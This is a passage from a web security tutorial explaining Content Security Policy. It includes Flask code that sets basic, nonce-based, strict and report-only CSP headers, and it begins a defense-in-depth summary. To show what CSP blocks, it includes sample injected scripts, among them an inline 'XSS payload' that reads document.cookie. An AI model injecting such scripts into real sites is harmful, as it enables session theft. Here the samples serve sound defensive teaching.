<span class="err">â”‚</span><span class="w">  </span><span class="mf">4.</span><span class="w"> </span><span class="n">Use</span><span class="w"> </span><span class="n">logic</span><span class="o">-</span><span class="n">less</span><span class="w"> </span><span class="n">templates</span><span class="w"> </span><span class="p">(</span><span class="n">Mustache</span><span class="p">)</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">possible</span><span class="w">             </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<hr />
<h2 id="8-content-security-policy-csp">8. Content Security Policy (CSP)<a class="header-link" href="#8-content-security-policy-csp" title="Permanent link">&para;</a></h2>
<h3 id="81-csp-as-a-defense-layer">8.1 CSP as a Defense Layer<a class="header-link" href="#81-csp-as-a-defense-layer" title="Permanent link">&para;</a></h3>
<p>Content Security Policy is an HTTP header that instructs the browser to only load resources from approved sources. It is the most effective defense-in-depth against XSS.</p>
<div class="highlight"><pre><span></span><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚<span class="w">              </span>Content<span class="w"> </span>Security<span class="w"> </span>Policy<span class="w">                             </span>â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>Without<span class="w"> </span>CSP:<span class="w">                                                    </span>â”‚
â”‚<span class="w">  </span>Any<span class="w"> </span><span class="nt">&lt;script&gt;</span><span class="w"> </span>tag<span class="w"> </span>executes,<span class="w"> </span>including<span class="w"> </span>injected<span class="w"> </span>ones<span class="w">             </span>â”‚
â”‚<span class="w">  </span><span class="nt">&lt;script&gt;</span>malicious_code()<span class="nt">&lt;/script&gt;</span><span class="w">  </span>â†’<span class="w"> </span>RUNS<span class="w">                     </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>With<span class="w"> </span>CSP:<span class="w">                                                       </span>â”‚
â”‚<span class="w">  </span>Browser<span class="w"> </span>blocks<span class="w"> </span>scripts<span class="w"> </span>not<span class="w"> </span>matching<span class="w"> </span>the<span class="w"> </span>policy<span class="w">                 </span>â”‚
â”‚<span class="w">  </span><span class="nt">&lt;script&gt;</span>malicious_code()<span class="nt">&lt;/script&gt;</span><span class="w">  </span>â†’<span class="w"> </span>BLOCKED<span class="w">                  </span>â”‚
â”‚<span class="w">  </span>(because<span class="w"> </span>inline<span class="w"> </span>scripts<span class="w"> </span>are<span class="w"> </span>not<span class="w"> </span>in<span class="w"> </span>the<span class="w"> </span>CSP<span class="w"> </span>allowlist)<span class="w">          </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>CSP<span class="w"> </span>Directives:<span class="w">                                                </span>â”‚
â”‚<span class="w">  </span>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>Directive<span class="w">        </span>â”‚<span class="w"> </span>Controls<span class="w">                          </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>default-src<span class="w">      </span>â”‚<span class="w"> </span>Fallback<span class="w"> </span>for<span class="w"> </span>all<span class="w"> </span>resource<span class="w"> </span>types<span class="w">   </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>script-src<span class="w">       </span>â”‚<span class="w"> </span>JavaScript<span class="w"> </span>sources<span class="w">                </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>style-src<span class="w">        </span>â”‚<span class="w"> </span>CSS<span class="w"> </span>sources<span class="w">                       </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>img-src<span class="w">          </span>â”‚<span class="w"> </span>Image<span class="w"> </span>sources<span class="w">                     </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>font-src<span class="w">         </span>â”‚<span class="w"> </span>Font<span class="w"> </span>sources<span class="w">                      </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>connect-src<span class="w">      </span>â”‚<span class="w"> </span>AJAX,<span class="w"> </span>WebSocket,<span class="w"> </span>EventSource<span class="w">      </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>frame-src<span class="w">        </span>â”‚<span class="w"> </span>iframe<span class="w"> </span>sources<span class="w">                    </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>media-src<span class="w">        </span>â”‚<span class="w"> </span>Audio/Video<span class="w"> </span>sources<span class="w">               </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>object-src<span class="w">       </span>â”‚<span class="w"> </span>Plugins<span class="w"> </span>(Flash,<span class="w"> </span>Java)<span class="w">             </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>form-action<span class="w">      </span>â”‚<span class="w"> </span>Form<span class="w"> </span>submission<span class="w"> </span>targets<span class="w">           </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>frame-ancestors<span class="w">  </span>â”‚<span class="w"> </span>Who<span class="w"> </span>can<span class="w"> </span>embed<span class="w"> </span>this<span class="w"> </span>page<span class="w">           </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>base-uri<span class="w">         </span>â”‚<span class="w"> </span>Restricts<span class="w"> </span><span class="nt">&lt;base&gt;</span><span class="w"> </span>tag<span class="w">              </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w"> </span>report-uri<span class="w">       </span>â”‚<span class="w"> </span>Where<span class="w"> </span>to<span class="w"> </span>send<span class="w"> </span>violation<span class="w"> </span>reports<span class="w">   </span>â”‚<span class="w">       </span>â”‚
â”‚<span class="w">  </span>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<span class="w">       </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre></div>

<h3 id="82-csp-implementation">8.2 CSP Implementation<a class="header-link" href="#82-csp-implementation" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">csp_implementation.py - Content Security Policy for Flask</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">secrets</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">make_response</span><span class="p">,</span> <span class="n">g</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># Level 1: Basic CSP (good starting point)</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">after_request</span>
<span class="k">def</span><span class="w"> </span><span class="nf">add_csp_basic</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Basic CSP that blocks most XSS.&quot;&quot;&quot;</span>
    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
        <span class="s2">&quot;default-src &#39;self&#39;; &quot;</span>          <span class="c1"># Only load from same origin</span>
        <span class="s2">&quot;script-src &#39;self&#39;; &quot;</span>           <span class="c1"># No inline scripts!</span>
        <span class="s2">&quot;style-src &#39;self&#39;; &quot;</span>            <span class="c1"># No inline styles!</span>
        <span class="s2">&quot;img-src &#39;self&#39; data:; &quot;</span>        <span class="c1"># Allow data: URIs for images</span>
        <span class="s2">&quot;font-src &#39;self&#39;; &quot;</span>
        <span class="s2">&quot;object-src &#39;none&#39;; &quot;</span>           <span class="c1"># No Flash/Java plugins</span>
        <span class="s2">&quot;frame-ancestors &#39;none&#39;; &quot;</span>      <span class="c1"># No embedding in iframes</span>
        <span class="s2">&quot;base-uri &#39;self&#39;; &quot;</span>             <span class="c1"># Prevent &lt;base&gt; hijacking</span>
        <span class="s2">&quot;form-action &#39;self&#39;&quot;</span>            <span class="c1"># Forms only submit to self</span>
    <span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># Level 2: CSP with nonces (for inline scripts when needed)</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">before_request</span>
<span class="k">def</span><span class="w"> </span><span class="nf">generate_csp_nonce</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Generate a unique nonce for each request.&quot;&quot;&quot;</span>
    <span class="n">g</span><span class="o">.</span><span class="n">csp_nonce</span> <span class="o">=</span> <span class="n">secrets</span><span class="o">.</span><span class="n">token_urlsafe</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">after_request</span>
<span class="k">def</span><span class="w"> </span><span class="nf">add_csp_nonce</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;CSP with nonce-based inline script allowlisting.&quot;&quot;&quot;</span>
    <span class="n">nonce</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="s1">&#39;csp_nonce&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;default-src &#39;self&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;script-src &#39;self&#39; &#39;nonce-</span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s2">&#39;; &quot;</span>  <span class="c1"># Only scripts with this nonce</span>
        <span class="sa">f</span><span class="s2">&quot;style-src &#39;self&#39; &#39;nonce-</span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s2">&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;img-src &#39;self&#39; data: https:; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;font-src &#39;self&#39; https://fonts.gstatic.com; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;connect-src &#39;self&#39; https://api.example.com; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;object-src &#39;none&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;frame-ancestors &#39;none&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;base-uri &#39;self&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;form-action &#39;self&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;report-uri /api/csp-report&quot;</span>
    <span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span>


<span class="c1"># In templates, use the nonce for inline scripts:</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="sd">&lt;!-- This inline script is ALLOWED because it has the correct nonce --&gt;</span>
<span class="sd">&lt;script nonce=&quot;{{ g.csp_nonce }}&quot;&gt;</span>
<span class="sd">    // Legitimate inline script</span>
<span class="sd">    document.getElementById(&#39;app&#39;).textContent = &#39;Hello&#39;;</span>
<span class="sd">&lt;/script&gt;</span>

<span class="sd">&lt;!-- This injected script is BLOCKED (no nonce) --&gt;</span>
<span class="sd">&lt;script&gt;</span>
<span class="sd">    // XSS payload - blocked by CSP!</span>
<span class="sd">    document.cookie;</span>
<span class="sd">&lt;/script&gt;</span>
<span class="sd">&quot;&quot;&quot;</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># Level 3: Strict CSP (Google recommended)</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">after_request</span>
<span class="k">def</span><span class="w"> </span><span class="nf">add_csp_strict</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Strict CSP based on Google&#39;s recommendations.&quot;&quot;&quot;</span>
    <span class="n">nonce</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="s1">&#39;csp_nonce&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
        <span class="c1"># strict-dynamic: trust scripts loaded by trusted scripts</span>
        <span class="sa">f</span><span class="s2">&quot;script-src &#39;nonce-</span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s2">&#39; &#39;strict-dynamic&#39; https:; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;object-src &#39;none&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;base-uri &#39;self&#39;; &quot;</span>
        <span class="c1"># Report violations</span>
        <span class="sa">f</span><span class="s2">&quot;report-uri /api/csp-report&quot;</span>
    <span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># CSP Violation Reporting</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/csp-report&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">csp_report</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Receive CSP violation reports.&quot;&quot;&quot;</span>
    <span class="n">report</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">(</span><span class="n">force</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">violation</span> <span class="o">=</span> <span class="n">report</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;csp-report&#39;</span><span class="p">,</span> <span class="p">{})</span>

    <span class="n">app</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;CSP Violation: </span><span class="si">{</span><span class="n">violation</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;violated-directive&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2"> &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;blocked: </span><span class="si">{</span><span class="n">violation</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;blocked-uri&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2"> &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;page: </span><span class="si">{</span><span class="n">violation</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;document-uri&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span>
    <span class="p">)</span>

    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">204</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># Report-Only Mode (for testing before enforcing)</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">after_request</span>
<span class="k">def</span><span class="w"> </span><span class="nf">add_csp_report_only</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Use Report-Only to test CSP without blocking anything.&quot;&quot;&quot;</span>
    <span class="n">nonce</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="s1">&#39;csp_nonce&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># Content-Security-Policy-Report-Only: logs but doesn&#39;t block</span>
    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Security-Policy-Report-Only&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;default-src &#39;self&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;script-src &#39;self&#39; &#39;nonce-</span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s2">&#39;; &quot;</span>
        <span class="sa">f</span><span class="s2">&quot;report-uri /api/csp-report&quot;</span>
    <span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span>
</code></pre></div>

<h3 id="83-csp-deployment-strategy">8.3 CSP Deployment Strategy<a class="header-link" href="#83-csp-deployment-strategy" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="err">â”‚</span><span class="w">              </span><span class="n">CSP</span><span class="w"> </span><span class="n">Deployment</span><span class="w"> </span><span class="n">Steps</span><span class="w">                                </span><span class="err">â”‚</span>
<span class="err">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Step</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span><span class="w"> </span><span class="n">Report</span><span class="o">-</span><span class="n">Only</span><span class="w"> </span><span class="n">Mode</span><span class="w">                                        </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Deploy</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">Content</span><span class="o">-</span><span class="n">Security</span><span class="o">-</span><span class="n">Policy</span><span class="o">-</span><span class="n">Report</span><span class="o">-</span><span class="n">Only</span><span class="w"> </span><span class="n">header</span><span class="w">          </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Monitor</span><span class="w"> </span><span class="n">violation</span><span class="w"> </span><span class="n">reports</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">1</span><span class="o">-</span><span class="mi">2</span><span class="w"> </span><span class="n">weeks</span><span class="w">                        </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Fix</span><span class="w"> </span><span class="n">legitimate</span><span class="w"> </span><span class="n">resources</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">would</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">blocked</span><span class="w">                 </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Step</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span><span class="w"> </span><span class="n">Basic</span><span class="w"> </span><span class="n">Enforcement</span><span class="w">                                       </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Switch</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">Content</span><span class="o">-</span><span class="n">Security</span><span class="o">-</span><span class="n">Policy</span><span class="w"> </span><span class="n">header</span><span class="w">                       </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Start</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">permissive</span><span class="w"> </span><span class="n">policy</span><span class="p">,</span><span class="w"> </span><span class="n">tighten</span><span class="w"> </span><span class="n">gradually</span><span class="w">                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Keep</span><span class="w"> </span><span class="n">report</span><span class="o">-</span><span class="n">uri</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">catch</span><span class="w"> </span><span class="n">issues</span><span class="w">                                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Step</span><span class="w"> </span><span class="mi">3</span><span class="p">:</span><span class="w"> </span><span class="n">Strict</span><span class="w"> </span><span class="n">Enforcement</span><span class="w">                                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Remove</span><span class="w"> </span><span class="s1">&#39;unsafe-inline&#39;</span><span class="w"> </span><span class="p">(</span><span class="n">use</span><span class="w"> </span><span class="n">nonces</span><span class="w"> </span><span class="n">instead</span><span class="p">)</span><span class="w">                    </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Remove</span><span class="w"> </span><span class="s1">&#39;unsafe-eval&#39;</span><span class="w">                                           </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Add</span><span class="w"> </span><span class="s1">&#39;strict-dynamic&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">loading</span><span class="w">                        </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Minimize</span><span class="w"> </span><span class="n">allowed</span><span class="w"> </span><span class="n">domains</span><span class="w">                                        </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Step</span><span class="w"> </span><span class="mi">4</span><span class="p">:</span><span class="w"> </span><span class="n">Maintain</span><span class="w">                                                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Review</span><span class="w"> </span><span class="n">CSP</span><span class="w"> </span><span class="n">reports</span><span class="w"> </span><span class="n">regularly</span><span class="w">                                    </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Update</span><span class="w"> </span><span class="n">policy</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">application</span><span class="w"> </span><span class="n">evolves</span><span class="w">                           </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="n">Test</span><span class="w"> </span><span class="n">CSP</span><span class="w"> </span><span class="n">changes</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">staging</span><span class="w"> </span><span class="n">first</span><span class="w">                              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<hr />
<h2 id="9-defense-in-depth-summary">9. Defense-in-Depth Summary<a class="header-link" href="#9-defense-in-depth-summary" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="err">â”‚</span><span class="w">          </span><span class="nt">Defense-in-Depth</span><span class="w"> </span><span class="nt">for</span><span class="w"> </span><span class="nt">Injection</span><span class="w">                           </span><span class="err">â”‚</span>
<span class="err">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">Layer</span><span class="w"> </span><span class="nt">1</span><span class="o">:</span><span class="w"> </span><span class="nt">Input</span><span class="w"> </span><span class="nt">Validation</span><span class="w">                                       </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">Whitelist</span><span class="w"> </span><span class="nt">validation</span><span class="w"> </span><span class="o">(</span><span class="nt">preferred</span><span class="w"> </span><span class="nt">over</span><span class="w"> </span><span class="nt">blacklist</span><span class="o">)</span><span class="w">             </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">Type</span><span class="w"> </span><span class="nt">checking</span><span class="w"> </span><span class="o">(</span><span class="nt">int</span><span class="o">,</span><span class="w"> </span><span class="nt">email</span><span class="o">,</span><span class="w"> </span><span class="nt">URL</span><span class="w"> </span><span class="nt">format</span><span class="o">)</span><span class="w">                     </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">Length</span><span class="w"> </span><span class="nt">limits</span><span class="w">                                               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â””â”€â”€</span><span class="w"> </span><span class="nt">Character</span><span class="w"> </span><span class="nt">set</span><span class="w"> </span><span class="nt">restrictions</span><span class="w">                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">Layer</span><span class="w"> </span><span class="nt">2</span><span class="o">:</span><span class="w"> </span><span class="nt">Parameterization</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nt">Safe</span><span class="w"> </span><span class="nt">APIs</span><span class="w">                          </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">Parameterized</span><span class="w"> </span><span class="nt">queries</span><span class="w"> </span><span class="o">(</span><span class="nt">SQL</span><span class="o">)</span><span class="w">                                </span><span class="err">â”‚</span>
